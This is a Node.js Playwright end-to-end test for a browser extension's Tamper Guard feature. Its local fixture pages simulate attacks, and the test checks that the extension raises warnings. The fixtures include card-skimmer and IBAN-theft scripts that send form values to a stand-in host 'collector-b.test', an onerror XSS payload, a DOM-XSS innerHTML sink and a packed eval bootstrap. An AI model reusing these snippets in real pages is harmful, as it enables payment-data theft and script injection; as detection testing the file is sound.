#!/usr/bin/env node
// ── tools/e2e-tamper-guard.mjs ───────────────────────────────────────────────────
// Real-Chromium test (5.1.0) for Tamper Guard — what only a browser shows:
//   • level 2, a checkout page (card field) whose JSON.parse was replaced by an editing wrapper (what a json-edit
//     filter rule does): 5.1.3 — rated Suspicious, so only the quiet toolbar mark; the page's next parse of data whose
//     field was edited makes it Critical: ONE warning WINDOW (an extension page, C47) with the risk rating, listing both
//     findings and the changed field — never its value;
//   • the same on a hostile page that stops the report event in the window capture phase (C47: the bridge listens first);
//   • level 2, an ordinary page with the same replacement: no window;
//   • level 2, a card number sent to another site (skimmer): a critical warning without countdown (tgCardSent);
//   • "Always ignore on this site" adds "Tamper: site" to the allow list: the same page again opens no window;
//   • owner 2026-11-24 — only the four ticks start the close watching: level 4 no longer watches an ordinary page
//     (its edited data: no window), a DOM-XSS page no tick applies to gets no window, the same page with a checkout
//     word does;
//   • 5.1.2, level 2: on a /checkout address (watched from the start, 5.1.1) a card number typed into a field with an
//     ordinary name is sent in an IMAGE address to another site → tgCardSent (Luhn value + address setter); a page
//     with its own card-number field next to a payment provider's frame → tgSecondCardForm; a payment page that loads
//     a script from a provider-imitating host → tgSuspiciousScript;
//   • 5.1.3: an IBAN sent from a bank-account form to another site → tgIbanSent; level 4: packed code through eval()
//     is stopped by blockObfuscatedEval and reported → tgObfuscatedCode (Suspicious warns at level 4);
//   • 5.1.2 XSS, level 2: a link on another site to a page whose address carries script code → the amber warning page
//     (warnXssLinks, reason xssLink); a page that copies its own address (#…) into innerHTML → tgAddressScript, an
//     ordinary page with the same code but a harmless address → no window;
//   • 5.1.3 (issue 4), level 2: a password field hidden AS A TRICK (type=hidden named "password"; a transparent field in
//     a visible form; a field placed off the page) arms an ordinary page — its edited data then warns, listing
//     tgHiddenCredential; a password field in a closed menu or a closed dialog, or a hidden reset token, does not.
// Test hosts are mapped to a local server (--host-resolver-rules); levels, messages, protection keys and rule ids come
// from the extension's own modules (C39a).
//
// Usage:  node e2e-tamper-guard.mjs --extension ../3P-Matrix [--chromium <path>]
// Exit:   0 = all pass · 1 = a case failed · 2 = did not run (C38)
// ─────────────────────────────────────────────────────────────────────────────

import { createServer } from "node:http";
import { existsSync } from "node:fs";
import { resolve, join } from "node:path";
import { pathToFileURL } from "node:url";

// ── Settings (one place) ─────────────────────────────────────────────────────
const EXIT = Object.freeze({ OK: 0, FAILED: 1, DID_NOT_RUN: 2 });
const LOCAL_ADDRESS = "127.0.0.1";
const HOST_A = "shop-a.test";                       // the page under test
const HOST_B = "collector-b.test";                  // "another site"
const HOST_FAKE_CDN = "jquery-cdn.net";             // 5.1.2: a script host that imitates a provider (mapped locally)
const XSS_PAYLOAD = "<img src=x onerror=window.xssRan=1>";     // 5.1.2: script code in an address
const SW_SETTLE_MS = 1500;                          // first rule/script apply after install
const APPLY_SETTLE_MS = 1500;                       // a level/protection change re-registers scripts
const WINDOW_TIMEOUT_MS = 8000;                     // a warning window must open within this
const NO_WINDOW_WAIT_MS = 5000;                     // …and must NOT open within this (ordinary page)
const ARM_SETTLE_MS = 800;                          // the arm message reaches the page's MAIN world
const CARD = "4111 1111 1111 1111";
const IBAN = "NL91 ABNA 0417 1643 00";              // 5.1.3: a valid (MOD-97) example IBAN
// 5.1.3: a Dean Edwards packer bootstrap — the shape blockObfuscatedEval stops (security/sec-no-obfuscated-code.js)
const PACKED = "eval(function(p,a,c,k,e,d){return p}('x',0,0,''.split('|'),0,{}))";
const EDITED_FIELD = "price";
// What chrome.action.getBadgeText returns while Chrome shows its own block count (displayActionCountAsBadgeText).
const CHROME_COUNT_RE = /ActionCount/;
// 5.1.3 (issue 4): the hidden-field trigger pages — path → expected: true = hidden as a trick (arms), false = layout.
const HIDDEN_FIELD_CASES = Object.freeze({
  "/login/hidden-type":  true,    // <input type=hidden name=password>
  "/login/transparent":  true,    // a password field with opacity 0 in a visible form
  "/login/off-page":     true,    // a password field placed far off the page
  "/login/closed-menu":  false,   // the whole sign-in form inside a closed (display:none) menu
  "/login/closed-dialog": false,  // the sign-in form inside a closed <dialog>
  "/login/reset-token":  false    // a hidden reset token named like a password (page plumbing)
});

function arg(name) { const i = process.argv.indexOf(`--${name}`); return i === -1 ? null : process.argv[i + 1]; }
function didNotRun(msg) { console.error(`e2e-tamper-guard: DID NOT RUN — ${msg}`); process.exit(EXIT.DID_NOT_RUN); }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

const ext = arg("extension");
if (!ext || !existsSync(join(ext, "manifest.json"))) didNotRun("missing or invalid --extension <folder>");
const EXT = resolve(ext);
let chromium, C, M, P, R, B, PS;
try { ({ chromium } = await import("playwright")); } catch { didNotRun("the playwright package is not installed"); }
try {
  C = await import(pathToFileURL(join(EXT, "data/constants.js")).href);
  M = await import(pathToFileURL(join(EXT, "data/message-types.js")).href);
  P = await import(pathToFileURL(join(EXT, "data/protections.js")).href);
  R = await import(pathToFileURL(join(EXT, "data/tamper-rules.js")).href);
  B = await import(pathToFileURL(join(EXT, "data/builtin-domains.js")).href);
  PS = await import(pathToFileURL(join(EXT, "data/page-scam-reasons.js")).href);
} catch (e) { didNotRun(`cannot import extension modules: ${e.message}`); }
const T = R.TAMPER_RULE;
const PAY_HOST = B.BUILTIN_PAYMENT.find((h) => h.split(".").length === 2) || B.BUILTIN_PAYMENT[0];   // a payment provider

// A page script that does what a json-edit filter rule does: JSON.parse replaced by a wrapper that edits one field.
const JSON_EDIT = `const _p = JSON.parse;
  JSON.parse = new Proxy(_p, { apply(t, self, args) { const r = Reflect.apply(t, self, args);
    if (r && typeof r === "object" && ${JSON.stringify(EDITED_FIELD)} in r) r[${JSON.stringify(EDITED_FIELD)}] = 0; return r; } });
  window.doParse = () => JSON.parse('{"${EDITED_FIELD}":10,"name":"x"}');`;
const CARD_FORM = `<form onsubmit="return false"><input id="cc" autocomplete="cc-number"><button id="pay">Pay</button></form>`;

// A visible sign-in form holding `fields`, on a page whose JSON.parse is replaced (JSON_EDIT).
function hiddenPage(fields) {
  return `<!doctype html><title>sign in</title><form onsubmit="return false" style="padding:20px">${fields}<button>Sign in</button></form>
    <script>${JSON_EDIT}</script>`;
}

// A page that copies its own address (#…) into innerHTML (DOM XSS), and one that runs packed code through eval().
const DOM_PAGE = `<!doctype html><title>dom</title><div id="out"></div>
      <script>document.getElementById("out").innerHTML = decodeURIComponent(location.hash.slice(1));</script>`;
const PACKED_PAGE = `<!doctype html><title>packed</title><p>packed<script>window.runPacked = () => { try { eval(${JSON.stringify(PACKED)}); } catch {} };</script>`;

function buildPages(port) {
  const other = (path) => `http://${HOST_B}:${port}${path}`;
  return Object.freeze({
    "/checkout": `<!doctype html><title>checkout</title>${CARD_FORM}<script>${JSON_EDIT}</script>`,
    "/checkout-hostile": `<!doctype html><title>checkout</title>${CARD_FORM}
      <script>addEventListener("3pmcf-tg-report", (e) => e.stopImmediatePropagation(), true);${JSON_EDIT}</script>`,
    "/article": `<!doctype html><title>article</title><p>news<script>${JSON_EDIT}</script>`,
    // 5.1.2: the card field has an ordinary name (only its VALUE says card); the data leaves in an image address.
    "/checkout/image": `<!doctype html><title>pay</title><form onsubmit="return false"><input id="num" name="payment[number]">
      <button id="pay">Pay</button></form>
      <script>document.getElementById("pay").onclick = () => { new Image().src = ${JSON.stringify(other("/p.gif?d="))} +
        encodeURIComponent(document.getElementById("num").value); };</script>`,
    "/fake-form": `<!doctype html><title>pay</title>${CARD_FORM}<iframe src="http://${PAY_HOST}:${port}/frame" width="300" height="80"></iframe>`,
    "/checkout/script": `<!doctype html><title>pay</title>${CARD_FORM}<script src="http://${HOST_FAKE_CDN}:${port}/jquery.min.js"></script>`,
    // 5.1.2 XSS: a link to another site's page with script code in its address; a page that copies its hash into innerHTML.
    "/xss-link": `<!doctype html><title>links</title><a id="go" href="http://${HOST_A}:${port}/search?q=${encodeURIComponent(XSS_PAYLOAD)}">result</a>`,
    "/dom": DOM_PAGE,
    "/checkout/dom": DOM_PAGE,                      // owner 2026-11-24: the same page where a tick applies (checkout word)
    // 5.1.3: an IBAN typed into a bank-account field is sent to another site.
    "/iban": `<!doctype html><title>transfer</title><form onsubmit="return false"><input id="iban" name="iban">
      <button id="send">Send</button></form>
      <script>document.getElementById("send").onclick = () => fetch(${JSON.stringify(other("/i"))},
        { method: "POST", mode: "no-cors", body: "a=" + encodeURIComponent(document.getElementById("iban").value) }).catch(() => {});</script>`,
    // 5.1.3: a page that runs packed (obfuscated) code through eval().
    "/packed": PACKED_PAGE,
    "/checkout/packed": PACKED_PAGE,
    // 5.1.3: the card number leaves as HTML TEXT (an <img> written with innerHTML) — caught by the resource watcher.
    // window.f0 = fetch as the page first saw it: the outgoing check must not wrap fetch before something was typed.
    "/checkout/html": `<!doctype html><title>pay</title><script>window.f0 = window.fetch;</script>${CARD_FORM}<div id="out"></div>
      <script>document.getElementById("pay").onclick = () => { document.getElementById("out").innerHTML =
        '<img src="' + ${JSON.stringify(other("/h.gif?d="))} + encodeURIComponent(document.getElementById("cc").value) + '">'; };</script>`,
    // 5.1.3 (issue 4) — HIDDEN_FIELD_CASES; every page also replaces JSON.parse like a json-edit rule (JSON_EDIT).
    "/login/hidden-type": hiddenPage(`<input name="user"><input type="hidden" name="password" value="">`),
    "/login/transparent": hiddenPage(`<input name="user"><input type="password" name="pw" style="opacity:0">`),
    "/login/off-page": hiddenPage(`<input name="user"><input type="password" name="pw" style="position:absolute;left:-9999px">`),
    "/login/closed-menu": `<!doctype html><title>menu</title><p>news</p><div style="display:none"><form><input name="user">
      <input type="password" name="pw"></form></div><script>${JSON_EDIT}</script>`,
    "/login/closed-dialog": `<!doctype html><title>dialog</title><p>news</p><dialog><form><input name="user">
      <input type="password" name="pw"></form></dialog><script>${JSON_EDIT}</script>`,
    "/login/reset-token": hiddenPage(`<input name="user"><input type="hidden" name="reset_password_token" value="abc">`),
    "/skim": `<!doctype html><title>pay</title>${CARD_FORM}
      <script>document.getElementById("pay").onclick = () => fetch(${JSON.stringify(other("/c"))},
        { method: "POST", mode: "no-cors", body: "n=" + encodeURIComponent(document.getElementById("cc").value) }).catch(() => {});</script>`
  });
}
let PAGES = {};
const server = createServer((req, res) => {
  const path = req.url.split(/[?#]/)[0];
  res.writeHead(200, { "content-type": "text/html" });
  res.end(PAGES[path] || "<!doctype html><title>other</title><p>" + path);
});
await new Promise((r) => server.listen(0, LOCAL_ADDRESS, r));
const PORT = server.address().port;
PAGES = buildPages(PORT);
const url = (host, path) => `http://${host}:${PORT}${path}`;

let ctx = null, failed = 0;
function ok(name, cond, info) {
  if (!cond) failed++;
  console.log(`${cond ? "PASS" : "FAIL"} ${name}${cond ? "" : "  " + JSON.stringify(info)}`);
}

try {
  ctx = await chromium.launchPersistentContext("", {
    headless: false, executablePath: arg("chromium") || undefined,
    args: ["--headless=new", `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`,
           `--host-resolver-rules=MAP ${HOST_A} ${LOCAL_ADDRESS}, MAP ${HOST_B} ${LOCAL_ADDRESS}, ` +
           `MAP ${PAY_HOST} ${LOCAL_ADDRESS}, MAP ${HOST_FAKE_CDN} ${LOCAL_ADDRESS}`]
  });
  let [sw] = ctx.serviceWorkers();
  if (!sw) sw = await ctx.waitForEvent("serviceworker");
  const extId = new URL(sw.url()).host;
  await sleep(SW_SETTLE_MS);
  const ctl = await ctx.newPage(); await ctl.goto(`chrome-extension://${extId}/ui/protections.html`);
  const send = (msg) => ctl.evaluate((m) => chrome.runtime.sendMessage(m), msg);
  // The ordinary site warning would interrupt these flows (test hosts score as unknown sites): off here.
  // 5.1.3: the suspicious-site warning has no switch of its own any more (part of Scam protection, which these
  // cases need); it stays on — opening a test page directly (no other site sent it) has not triggered it.
  await send({ type: M.MSG_SET_LEVEL, level: C.LEVEL.MILD });
  await sleep(APPLY_SETTLE_MS);

  // A warning window is a popup the service worker opens: its page appears in the context; it is found by polling
  // the context's pages for a NEW one at the warning address (its first URL may still be about:blank).
  const POLL_MS = 200;
  function isWarning(p) { return p.url().includes(C.TAMPER_WARNING_PAGE); }
  function nextWarning(timeout = WINDOW_TIMEOUT_MS) {
    const known = new Set(ctx.pages());
    return (async () => {
      for (let waited = 0; waited < timeout; waited += POLL_MS) {
        const w = ctx.pages().find((p) => !known.has(p) && isWarning(p));
        if (w) {
          // The window may still be loading (or navigating from about:blank): poll its title until the model arrived.
          for (let t = 0; t < timeout; t += POLL_MS) {
            const title = await w.textContent("#tgTitle").catch(() => null);
            if (title && title !== "…") break;
            await sleep(POLL_MS);
          }
          return w;
        }
        await sleep(POLL_MS);
      }
      return null;
    })();
  }
  async function open(host, path) { const pg = await ctx.newPage(); await pg.goto(url(host, path)); return pg; }
  async function click(w, id) { await w.click(`#${id}`); await w.waitForEvent("close", { timeout: WINDOW_TIMEOUT_MS }).catch(() => {}); }

  // 5.1.3: the toolbar badge text of the tab showing `pageUrl` (owner 2026-11-24: one symbol, the highest problem
  // wins — "?" / "!" — else Chrome's own block count, which getBadgeText reports as a placeholder text).
  const badgeNow = (pageUrl) => ctl.evaluate(async (u) => {
    const t = (await chrome.tabs.query({})).find((x) => x.url === u);
    return t ? chrome.action.getBadgeText({ tabId: t.id }) : null;
  }, pageUrl);
  // The badge is drawn after a short coalescing delay (BADGE_RENDER_DELAY_MS): poll until it shows `want`.
  async function badgeOf(pageUrl, want) {
    let text = null;
    for (let t = 0; t < WINDOW_TIMEOUT_MS; t += POLL_MS) {
      text = await badgeNow(pageUrl);
      if (text === want) break;
      await sleep(POLL_MS);
    }
    return text;
  }
  const isChromeCount = (text) => typeof text === "string" && CHROME_COUNT_RE.test(text);
  const signalsOf = (win) => win.textContent("#tgSignals");
  const ruleLabel = (rule) => R.TAMPER_RULE_BY_ID[rule].label;
  const ratingLabel = (rating) => R.TAMPER_RATING_LABEL[rating];

  // ── level 2: checkout page with a json-edit-like JSON.parse ──
  let warnP = nextWarning(NO_WINDOW_WAIT_MS);
  let pg = await open(HOST_A, "/checkout");
  let w = await warnP;
  ok("checkout page, JSON.parse replaced: Suspicious at level 2 — no window", !w);
  const markedText = await badgeOf(url(HOST_A, "/checkout"), C.BADGE_TEXT.SUSPECT);
  ok("…only the toolbar badge: \"?\" (Suspicious)", markedText === C.BADGE_TEXT.SUSPECT, markedText);
  warnP = nextWarning();
  const parsed = await pg.evaluate(() => window.doParse());
  ok("the page still gets the replaced function's result (Tamper Guard never changes it)", parsed[EDITED_FIELD] === 0, parsed);
  w = await warnP;
  ok("edited data on top: Critical — the warning window opens", !!w);
  if (w) {
    ok("…with the risk rating", (await w.textContent("#tgRating")) === ratingLabel(C.TAMPER_RATING.CRITICAL), await w.textContent("#tgRating"));
    const list = await signalsOf(w);
    ok("…listing both findings", list.includes(ruleLabel(T.DATA_EDITED)) && list.includes(ruleLabel(T.DATA_PARSING)) && list.includes("JSON.parse"), list);
    ok("…naming the changed field, never its value", list.includes(EDITED_FIELD) && !list.includes("10"), list);
    ok("…and no countdown (critical)", await w.isHidden("#tgCountdown"));
    await click(w, "btnIgnore");
  }
  const critText = await badgeOf(url(HOST_A, "/checkout"), C.BADGE_TEXT.PHISHING);
  ok("Critical: the badge says \"!\" (the highest problem wins)", critText === C.BADGE_TEXT.PHISHING, critText);
  await pg.close();

  // ── hostile page: stops the report event first (C47); "Always ignore on this site" (5.1.3) ──
  const allowText = async () => (await send({ type: M.MSG_GET_OPTIONS })).data.allowList;
  pg = await open(HOST_A, "/checkout-hostile");
  await sleep(ARM_SETTLE_MS);
  warnP = nextWarning();
  await pg.evaluate(() => window.doParse());
  w = await warnP;
  ok("a page that stops the report event in the window capture phase still gets the warning (C47)", !!w);
  if (w) await click(w, "btnAlwaysIgnore");
  await pg.close();
  const tamperLine = `Tamper: ${HOST_A}`;
  ok("\"Always ignore on this site\" puts the site on the allow list under Tamper", (await allowText()).split("\n").includes(tamperLine), await allowText());

  // ── the same site again → no window ──
  warnP = nextWarning(NO_WINDOW_WAIT_MS);
  pg = await open(HOST_A, "/checkout");
  await sleep(ARM_SETTLE_MS);
  await pg.evaluate(() => window.doParse());
  w = await warnP;
  ok("with the site under Tamper: no warning window", !w);
  await pg.close();
  const rest = (await allowText()).split("\n").filter((l) => l && l !== tamperLine).join("\n");
  await send({ type: M.MSG_SET_ALLOW_LIST, text: rest });                       // Save without it (Allow list tab)
  ok("removed again on the Allow list tab", !(await allowText()).split("\n").includes(tamperLine));

  // ── level 2: ordinary page → noted only ──
  warnP = nextWarning(NO_WINDOW_WAIT_MS);
  pg = await open(HOST_B, "/article");
  w = await warnP;
  ok("level 2, ordinary page with the same replacement: no warning window", !w);
  const plain = await badgeNow(url(HOST_B, "/article"));
  ok("…and no symbol: the badge is Chrome's own block count", isChromeCount(plain), plain);
  await pg.close();

  // ── skimmer: a card number to another site ──
  pg = await open(HOST_A, "/skim");
  await sleep(ARM_SETTLE_MS);
  await pg.fill("#cc", CARD);
  warnP = nextWarning();
  await pg.click("#pay");
  w = await warnP;
  ok("a card number sent to another site: critical warning (tgCardSent)", !!w && (await signalsOf(w)).includes(ruleLabel(T.CARD_SENT)) &&
     (await w.textContent("#tgRating")) === ratingLabel(C.TAMPER_RATING.CRITICAL));
  if (w) {
    ok("…naming the destination host", (await signalsOf(w)).includes(HOST_B));
    ok("…and no countdown (critical)", await w.isHidden("#tgCountdown"));
    await click(w, "btnIgnore");
  }
  await pg.close();

  // ── 5.1.3: an IBAN sent to another site ──
  pg = await open(HOST_A, "/iban");
  await sleep(ARM_SETTLE_MS);
  await pg.fill("#iban", IBAN);
  warnP = nextWarning();
  await pg.click("#send");
  w = await warnP;
  ok("5.1.3: an IBAN sent to another site from a bank-account form: warning (tgIbanSent)",
     !!w && (await signalsOf(w)).includes(ruleLabel(T.IBAN_SENT)) && (await signalsOf(w)).includes(HOST_B), { list: w && await signalsOf(w).catch(() => null) });
  if (w) {
    ok("…never the IBAN itself", !(await signalsOf(w)).replace(/\s/g, "").includes(IBAN.replace(/\s/g, "")));
    await click(w, "btnIgnore");
  }
  await pg.close();

  // ── 5.1.3: outgoing check only after typing; card number in HTML text (resource watcher) ──
  pg = await open(HOST_A, "/checkout/html");
  await sleep(ARM_SETTLE_MS);
  ok("5.1.3: armed page, nothing typed yet — fetch is not wrapped", await pg.evaluate(() => window.fetch === window.f0));
  await pg.fill("#cc", CARD);
  await sleep(ARM_SETTLE_MS);
  ok("…after a card number is typed, the outgoing check is on (fetch wrapped)", await pg.evaluate(() => window.fetch !== window.f0));
  warnP = nextWarning();
  await pg.click("#pay");
  w = await warnP;
  ok("5.1.3: a card number written into the page as an <img> in HTML text: warning (tgCardSent, resource watcher)",
     !!w && (await signalsOf(w)).includes(ruleLabel(T.CARD_SENT)) && (await signalsOf(w)).includes(HOST_B), { list: w && await signalsOf(w).catch(() => null) });
  if (w) await click(w, "btnIgnore");
  await pg.close();

  // ── 5.1.2: card number recognised by value, sent in an image address ──
  pg = await open(HOST_A, "/checkout/image");
  await sleep(ARM_SETTLE_MS);
  await pg.fill("#num", CARD);
  warnP = nextWarning();
  await pg.click("#pay");
  w = await warnP;
  ok("5.1.2: a card number (field with an ordinary name) sent in an image address: critical warning (tgCardSent)",
     !!w && (await signalsOf(w)).includes(ruleLabel(T.CARD_SENT)), { list: w && await signalsOf(w).catch(() => null) });
  if (w) {
    ok("…naming the destination host", (await signalsOf(w)).includes(HOST_B));
    await click(w, "btnIgnore");
  }
  await pg.close();

  // ── 5.1.2: own card-number field next to a payment provider's frame ──
  warnP = nextWarning();
  pg = await open(HOST_A, "/fake-form");
  w = await warnP;
  ok(`5.1.2: own card field + a payment provider's frame (${PAY_HOST}): warning (tgSecondCardForm)`,
     !!w && (await signalsOf(w)).includes(ruleLabel(T.SECOND_CARD_FORM)), { list: w && await signalsOf(w).catch(() => null) });
  if (w) {
    ok("…naming the provider's frame under its own heading", (await signalsOf(w)).includes(`${R.TAMPER_RULE_BY_ID[T.SECOND_CARD_FORM].detailHead} ${PAY_HOST}`),
       await signalsOf(w));
    ok("…rated High risk, with a countdown", (await w.textContent("#tgRating")) === ratingLabel(C.TAMPER_RATING.HIGH) && !(await w.isHidden("#tgCountdown")));
    await click(w, "btnIgnore");
  }
  await pg.close();

  // ── 5.1.2: a script from a provider-imitating host on a payment page ──
  warnP = nextWarning();
  pg = await open(HOST_A, "/checkout/script");
  w = await warnP;
  ok(`5.1.2: a payment page loading a script from ${HOST_FAKE_CDN}: warning (tgSuspiciousScript)`,
     !!w && (await signalsOf(w)).includes(ruleLabel(T.SUSPICIOUS_SCRIPT)), { list: w && await signalsOf(w).catch(() => null) });
  if (w) {
    ok("…naming the script host", (await signalsOf(w)).includes(HOST_FAKE_CDN));
    await click(w, "btnIgnore");
  }
  await pg.close();

  // ── 5.1.2 XSS link (Browsing): another site's link with script code in the address ──
  pg = await open(HOST_B, "/xss-link");
  await pg.click("#go");
  for (let t = 0; t < WINDOW_TIMEOUT_MS && !pg.url().includes(C.WARNING_PAGE); t += POLL_MS) await sleep(POLL_MS);   // the tab is redirected
  const xssUrl = new URL(pg.url());
  ok("5.1.2: a link from another site with script code in the address opens the warning page (warnXssLinks)",
     xssUrl.pathname.endsWith(C.WARNING_PAGE) && xssUrl.searchParams.get(C.WARNING_REASON_PARAM) === PS.PAGE_SCAM_KIND.XSS_LINK, pg.url());
  if (xssUrl.pathname.endsWith(C.WARNING_PAGE)) {
    const sender = HOST_B.split(".").slice(-2).join(".");                     // the page fills its text after loading
    // The page fills its text after loading; a second load of the same warning (the tab navigated again) destroys the
    // context a single waitForFunction runs in — so poll, and try again after such a reload.
    for (let t = 0; t < WINDOW_TIMEOUT_MS; t += POLL_MS) {
      const has = await pg.evaluate((x) => !!document.body && document.body.textContent.includes(x), sender).catch(() => false);
      if (has) break;
      await sleep(POLL_MS);
    }
    ok("…naming the site that sent you", (await pg.textContent("body")).includes(sender),
       { url: pg.url(), body: (await pg.textContent("body").catch(() => "")).replace(/\s+/g, " ").slice(0, 400) });
  }
  await pg.close();

  // ── 5.1.2 DOM XSS (Tamper): the page copies script code from its own address into innerHTML ──
  warnP = nextWarning(NO_WINDOW_WAIT_MS);
  pg = await open(HOST_A, `/dom#${encodeURIComponent(XSS_PAYLOAD)}`);
  w = await warnP;
  ok("owner 2026-11-24: the same on a page no tick applies to: not watched, no window", !w);
  if (w) await click(w, "btnIgnore");
  await pg.close();
  warnP = nextWarning();
  pg = await open(HOST_A, `/checkout/dom#${encodeURIComponent(XSS_PAYLOAD)}`);
  w = await warnP;
  ok("5.1.2: a watched page putting script code from its address into innerHTML: warning (tgAddressScript)",
     !!w && (await signalsOf(w)).includes(ruleLabel(T.ADDRESS_SCRIPT)), { list: w && await signalsOf(w).catch(() => null) });
  if (w) {
    ok("…naming where it was put", (await signalsOf(w)).includes("innerHTML"));
    await click(w, "btnIgnore");
  }
  await pg.close();
  warnP = nextWarning(NO_WINDOW_WAIT_MS);
  pg = await open(HOST_A, "/checkout/dom#hello-world");
  w = await warnP;
  ok("…the same page with a harmless address: no window", !w);
  await pg.close();

  // ── 5.1.3 (issue 4), level 2: only a field hidden as a trick starts the closer watching ──
  // Armed, the page's edited data is reported (dynamic layer) and the rating reaches Critical: a window. Not armed, the
  // edited data is never reported: no window.
  for (const [path, trick] of Object.entries(HIDDEN_FIELD_CASES)) {
    pg = await open(HOST_A, path);
    await sleep(ARM_SETTLE_MS);
    warnP = nextWarning(trick ? WINDOW_TIMEOUT_MS : NO_WINDOW_WAIT_MS);
    await pg.evaluate(() => window.doParse());
    w = await warnP;
    if (trick) {
      ok(`5.1.3: ${path} — hidden as a trick: watched closely, its edited data warns, listing tgHiddenCredential`,
         !!w && (await signalsOf(w)).includes(ruleLabel(T.HIDDEN_CREDENTIAL)) && (await signalsOf(w)).includes(ruleLabel(T.DATA_EDITED)),
         { list: w && await signalsOf(w).catch(() => null) });
      if (w) await click(w, "btnIgnore");
    } else {
      ok(`5.1.3: ${path} — not a trick: not watched closely, no window`, !w, { list: w && await signalsOf(w).catch(() => null) });
    }
    await pg.close();
  }

  // ── level 4: an ordinary page is NOT watched (owner 2026-11-24: only the four ticks) ──
  // 5.1.3: from here on no case needs Scam protection, and at level 4 its suspicious-site warning takes over the
  // made-up test hosts' navigation — so the whole Scam protection is off (its warning has no switch of its own).
  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.ENABLE_SCAM_PROTECTION, enabled: false });
  await send({ type: M.MSG_SET_LEVEL, level: C.LEVEL.HIGH });
  await sleep(APPLY_SETTLE_MS);
  pg = await open(HOST_B, "/article");
  await sleep(ARM_SETTLE_MS);
  warnP = nextWarning(NO_WINDOW_WAIT_MS);
  await pg.evaluate(() => window.doParse());
  w = await warnP;
  ok("owner 2026-11-24: level 4 no longer watches every page — an ordinary page's edited data: no window", !w,
     { list: w && await signalsOf(w).catch(() => null) });
  if (w) await click(w, "btnIgnore");
  await pg.close();

  // ── 5.1.3, level 4: obfuscated code stopped by blockObfuscatedEval is a signal (Suspicious warns at level 4) ──
  pg = await open(HOST_B, "/checkout/packed");
  await sleep(ARM_SETTLE_MS);
  warnP = nextWarning();
  await pg.evaluate(() => window.runPacked());
  w = await warnP;
  ok("5.1.3, level 4, watched page: packed code through eval() is stopped and reported (tgObfuscatedCode)",
     !!w && (await signalsOf(w)).includes(ruleLabel(T.OBFUSCATED_CODE)) && (await signalsOf(w)).includes("eval") &&
     (await w.textContent("#tgRating")) === ratingLabel(C.TAMPER_RATING.SUSPICIOUS), { list: w && await signalsOf(w).catch(() => null) });
  if (w) await click(w, "btnIgnore");
  await pg.close();
} catch (e) {
  failed++;
  console.error("e2e-tamper-guard: error —", e);
} finally {
  if (ctx) await ctx.close().catch(() => {});
  server.close();
}

if (failed) { console.error(`e2e-tamper-guard: FAIL — ${failed} case(s)`); process.exit(EXIT.FAILED); }
console.log("e2e-tamper-guard: ALL PASS");
process.exit(EXIT.OK);
